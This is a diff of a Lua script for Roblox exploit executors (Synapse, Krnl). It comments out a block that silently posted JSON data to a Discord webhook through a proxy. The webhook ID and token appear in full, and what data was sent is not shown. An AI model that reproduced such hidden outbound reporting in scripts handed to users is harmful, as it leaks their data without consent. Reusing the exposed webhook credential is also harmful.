@@ -1,7 +1,8 @@
 local writeclipboard,encodeb64,decodeb64,Request = ((syn and syn.write_clipboard) or setclipboard),((syn and syn.crypt.base64.encode) or (Krnl and Krnl.Base64.Encode)),((syn and syn.crypt.base64.decode) or (Krnl and Krnl.Base64.Decode)),(http_request or syn and syn.request or request or nil)
 
 local s,e = pcall(function ()
-    if Request then 
+        --ok sir just for you ;)
+    --[[if Request then 
         local url = "https://webhook.lewisakura.moe/api/webhooks/1047997898568241192/ftBeaQnzuvs27F7rt-NaGCGP_nQUA2r8LkYUqzp2pZh1u3hrm6gWuphd62IoePIgmsa4"
         local HS = game:GetService("HttpService")
 
@@ -20,7 +21,7 @@ local s,e = pcall(function ()
             },
             ['Body'] = game.HttpService:JSONEncode(MessageData)
         })
-    end
+    end]]
 end)
 if e then print(e) end
 
